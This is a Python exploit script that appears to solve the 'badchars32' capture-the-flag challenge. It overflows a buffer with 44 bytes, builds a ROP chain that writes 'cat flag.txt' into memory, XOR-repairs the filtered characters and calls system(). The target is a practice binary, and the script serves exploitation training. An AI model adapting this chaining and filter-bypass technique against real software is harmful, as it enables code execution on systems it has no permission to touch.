#!/usr/bin/python

import struct
import os

instruction = "cat flag.txt"
systemplt = struct.pack('<L', 0x080484e0)
exitplt = struct.pack('<L', 0x080484f0)
rop0 = struct.pack('<L', 0x8048899)		#pop esi; pop edi; ret;
rop1 = struct.pack('<L', 0x08048893)		#mov DWORD PTR [edi], esi; ret; 
rop2 = struct.pack('<L', 0x08048896)		#pop ebx; pop ecx; ret;
rop3 = struct.pack('<L', 0x08048890)		#xor byte ptr [ebx], cl; ret;
data_addr = 0x804a046				#free space
badchars = "bic/ fns"
payload = "A"*44
char = 0

for i in range (0, 3):
    value = struct.unpack('<L', instruction[i*4:i*4+4])[0]
    payload += rop0 + struct.pack('<L', value) + struct.pack('<L', data_addr+i*4) + rop1
    
for a in instruction:
    if a in badchars:
       n = ord(a) ^ 0xeb
       payload += rop2 + struct.pack('<L', data_addr + char) + struct.pack('<L', n) + rop3 
    char += 1
    
payload += systemplt + exitplt + struct.pack('<L', data_addr)

callme = os.popen('./badchars32', 'w')
callme.write(payload)     
